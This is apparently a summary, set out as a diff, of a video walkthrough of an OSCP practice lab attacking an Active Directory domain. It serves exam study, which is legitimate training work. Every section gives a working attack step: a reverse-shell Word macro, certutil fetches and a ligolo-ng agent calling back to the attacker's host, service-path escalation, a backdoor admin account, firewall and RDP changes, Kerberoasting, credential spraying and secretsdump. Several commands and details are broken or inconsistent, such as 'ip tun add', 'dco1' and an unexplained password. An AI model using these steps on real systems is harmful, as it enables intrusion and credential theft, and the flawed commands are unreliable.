@@ -1,0 +1,155 @@
+Here are the commands and key lessons from the "OSCP Practice Lab: Active Directory Attack Path #3 (Advanced/Client-Side Exploits)" video for your OSCP exam preparation. This walkthrough focuses on more advanced techniques, including client-side exploitation and persistent access.
+
+### Initial Setup and Reconnaissance
+
+* **VPN Connection**:
+    * Connect to the VPN using the provided `.ovpn` profile.
+        * `openvpn <profile_name>.ovpn`
+* **Update `/etc/hosts` File**:
+    * Add target IP addresses and hostnames to `/etc/hosts` for easier access via DNS names.
+        * `sudo nano /etc/hosts`
+        * `192.168.100.201 ms01`
+        * `10.10.10.200 dc01`
+        * `10.10.10.202 ms02`
+        * **Lesson**: Adding entries to `/etc/hosts` allows using human-readable hostnames instead of IP addresses, simplifying commands and improving workflow.
+* **Organize Target Folders**:
+    * Create subfolders for `ad` (main lab directory), `vpn` (VPN profiles), and within each target (e.g., `ms01`): `enu` (enumeration logs), `files` (downloaded files), `loot` (flags), `exploits` (exploit scripts), `creds` (credentials), `users`, `passwords`, `hashes`.
+* **Initial Connectivity Check**:
+    * Ping targets to check for firewall status: `ping ms01`.
+        * **Lesson**: No ping response often indicates a firewall is active, but other services might still be accessible.
+
+---
+
+### Gaining Initial Foothold (ms01)
+
+* **Nmap Scan (ms01)**:
+    * Initial quick scan for all ports: `sudo nmap -Pn -v -p- ms01 -oN enu/nmap_all_ports.log`.
+    * Targeted scan with service detection and default scripts for open ports: `sudo nmap -sV -sC -p80,443,1978-1980 ms01 -oN enu/nmap_versions.log`.
+        * **Identified Services**: Apache 2.4.56 on ports 80 and 443.
+* **Gobuster Directory Brute-Forcing (ms01)**:
+    * `gobuster dir -u http://ms01 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o enu/gobuster_common.log`.
+        * **Lesson**: Use `grep -v 403` to filter out "Access Denied" responses and focus on successful hits.
+        * **Discovered Directories**: `/index.html` (default), `/uploads`.
+* **Web Enumeration (ms01)**:
+    * Use `curl` to examine web content for clues: `curl http://ms01`.
+        * **Discovered Domain Name**: `gail@ocp.lab` was found on the web page, revealing the domain `ocp.lab`.
+        * **Lesson**: This is a critical step for Active Directory environments. Update `/etc/hosts` with the domain name for the DC: `10.10.10.200 dc01.ocp.lab`.
+
+---
+
+### Client-Side Exploitation (ms01)
+
+* **Create Malicious Word Document (Kali, Windows VM)**:
+    * Open Microsoft Word on a Windows VM.
+    * Create a blank document with dummy text.
+    * Record a new macro: `Developer > Record Macro`.
+        * Name it `revShellOne`.
+    * Edit the macro (Alt+F11) and paste a PowerShell reverse shell command.
+        * **Lesson**: The video demonstrates using a base64 encoded PowerShell reverse shell to bypass command line length limitations and avoid special characters issues.
+        * Start a Python web server to host the PowerShell payload: `python3 -m http.server 80`.
+        * **Lesson**: Since the macro executes a shell, it will bypass many security measures by not being an executable.
+    * Save the document as a **Word 97-2003 Document (`.doc`)** to enable macros.
+* **Serve Malicious Document and Trigger Exploit**:
+    * Host the `.doc` file on your Python web server.
+    * On `ms01`, open the web browser and download the malicious `.doc` file from your Kali web server.
+    * On `ms01`, open the downloaded `.doc` file.
+    * **Lesson**: Word documents with malicious macros can be delivered via client-side means (e.g., social engineering, web download). When the document is opened, the macro executes.
+    * Set up a Netcat listener on your Kali machine: `nc -nvlp 443`.
+    * The macro should execute and connect back to your listener.
+* **Initial Shell (ms01)**:
+    * Check user: `whoami` (should be `bernie` on `ms01`).
+    * **Lesson**: This grants an initial shell as a standard user, which often requires further privilege escalation.
+
+---
+
+### Privilege Escalation (ms01)
+
+* **Transfer WinPEAS to ms01**:
+    * Download WinPEAS (e.g., `winPEASx64.exe`) from GitHub.
+    * Host it on your Python web server.
+    * Download on ms01 using `certutil`: `certutil.exe -urlcache -f http://172.16.11.11/win.exe C:\Users\Public\win.exe`.
+    * Execute WinPEAS: `C:\Users\Public\win.exe`.
+* **WinPEAS Analysis and Unquoted Service Path (ms01)**:
+    * **Discovered Vulnerability**: "Wise Boot Assistant" service (Unquoted Service Path) with writable permissions in `C:\Program Files (x86)\Wise Care 365\`.
+* **Exploiting Unquoted Service Path (ms01)**:
+    * Copy your `win_rev_443.exe` payload to `C:\Program Files (x86)\Wise Care 365\Wise.exe`: `copy C:\Users\Public\win_rev_443.exe "C:\Program Files (x86)\Wise Care 365\Wise.exe"`.
+    * Set up a Netcat listener on your Kali machine (port 443).
+    * Reboot ms01: `shutdown /r /t 1`.
+* **Privileged Shell (ms01)**:
+    * Check user: `whoami` (should be `nt authority\system` on `ms01`).
+    * **Loot**: Find `local.txt` (under `C:\Users\Bernie\Desktop`): `dir /s /b C:\Users\*.txt | findstr /i local.txt`.
+    * **Loot**: Find `proof.txt` (under `C:\Users\Administrator\Desktop`): `dir /s /b C:\Users\*.txt | findstr /i proof.txt`.
+
+---
+
+### Post-Exploitation & Persistence (ms01)
+
+* **Create Backdoor Account**:
+    * Add a new user: `net user backdoor P@ssw0rd123 /add`.
+    * Add user to administrators group: `net localgroup administrators backdoor /add`.
+    * **Lesson**: Creating a backdoor account with administrative privileges provides a persistent and easy way to regain access to the compromised machine.
+* **Disable Firewall**:
+    * Disable the Windows Firewall for all profiles (domain, private, public): `netsh advfirewall set allprofiles state off`.
+    * **Lesson**: Disabling the firewall can simplify future network movements and tool usage by removing common blocks.
+
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+---
+
+### Active Directory Reconnaissance
+
+* **Find AD Breadcrumbs (ms01 as System)**:
+    * Enumerate users' Powershell history for credentials: `type C:\Users\WildStyle\Documents\WindowsPowerShell\PSReadline\ConsoleHost_history.txt`.
+    * **Discovered Credentials**: `wildstyle` with password `Awesome24!`.
+* **Pivoting with Ligolo-ng (from Kali and ms01)**:
+    * Download `ligolo-ng` agent (Windows 64-bit) and proxy (Linux 64-bit) from GitHub.
+    * Move proxy to `/usr/local/bin/`.
+    * Create a tun interface: `sudo ip tun add tun0 type tun mode tun`.
+    * Set the interface up: `sudo ip link set tun0 up`.
+    * Start `ligolo-ng` proxy on Kali: `ligolo-ng proxy -selfcert`.
+    * Host `ligolo-ng` agent on Python web server.
+    * Transfer `agent.exe` to ms01 using `certutil`.
+    * Connect agent to proxy: `agent.exe -connect 172.16.11.11:11601 -ignore-cert`.
+    * Add routing for the internal network (10.10.10.0/24) through tun0: `sudo ip route add 10.10.10.0/24 dev tun0`.
+    * **Lesson**: `ligolo-ng` allows access to internal networks from the Kali box, enabling further enumeration of domain resources.
+* **Kerberoasting and AS-REP Roasting (from Kali)**:
+    * **Kerberoasting**: `impacket-GetUserSPNs -request -dc-ip 10.10.10.200 'ocp.lab/wildstyle'`.
+        * **Discovered Hash**: for `serviceaccount`.
+    * **AS-REP Roasting**: `impacket-GetNPUsers -request -dc-ip 10.10.10.200 'ocp.lab/wildstyle'`.
+        * **Discovered Hash**: for `metalbeard`.
+    * **Crack Hashes with Hashcat**:
+        * `hashcat -m 13100 -a 0 <kerberos_hash_file> /usr/share/wordlists/rockyou.txt`.
+        * **Cracked Password**: `Portland7@` for `serviceaccount`.
+* **SMB Enumeration with New Credentials (Kali)**:
+    * `crackmapexec smb 10.10.10.200 -u users.txt -p passwords.txt --continue-on-success` (using `serviceaccount` and `wildstyle` credentials).
+    * `smbclient \\\\10.10.10.200\\backups -U 'OCP.LAB\serviceaccount%Portland7@'`.
+        * **Discovered File**: `it-users.zip`.
+    * Download and crack `it-users.zip`:
+        * `zip2john it-users.zip > it-users.hash`.
+        * `john --wordlist=/usr/share/wordlists/rockyou.txt it-users.hash`.
+        * **Cracked Password**: `tbrick14`.
+        * Extract `it-users.zip` with the password `tbrick14`.
+        * **Discovered Credentials (in text file)**: New set of usernames and passwords.
+    * Spray new credentials (from `it_users.txt`) against `dco1` and `ms02`: `crackmapexec smb 10.10.10.200,10.10.10.202 -u users.txt -p passwords.txt --continue-on-success`.
+        * **Discovered Admin**: `emt` on `ms02` with admin privileges.
+
+---
+
+### Lateral Movement and Domain Ownage
+
+* **Lateral Movement to ms02 (from Kali using impacket-psexec)**:
+    * `impacket-psexec OCP.LAB/emt:'RexRules@123' @10.10.10.202`.
+* **Find Domain Admin Credentials (ms02 as System)**:
+    * Enumerate domain users: `net user /domain`.
+    * Enumerate a specific domain user: `net user LordBusiness /domain` (revealed `LordBusiness` is a `Domain Admin`).
+    * Dump cached credentials from `ms02` remotely using `impacket-secretsdump`: `impacket-secretsdump -sam -system -security -ntds 'OCP.LAB/emt:RexRules@123'@10.10.10.202` (Corrected syntax).
+        * **Discovered Credentials**: `LordBusiness` with plaintext password `TacosTuesday`.
+* **Domain Admin Shell on dco1 (from Kali using evil-winrm)**:
+    * `evil-winrm -i 10.10.10.200 -u LordBusiness -p 'TacosTuesday'`.
+* **Final Loot (dco1 as Domain Admin)**:
+    * Retrieve `proof.txt` from `C:\Users\Administrator\Desktop`: `type proof.txt`.
+    * Screenshot `whoami`, `ipconfig`, `hostname` for final submission.
+
+---
+
+http://googleusercontent.com/youtube_content/8
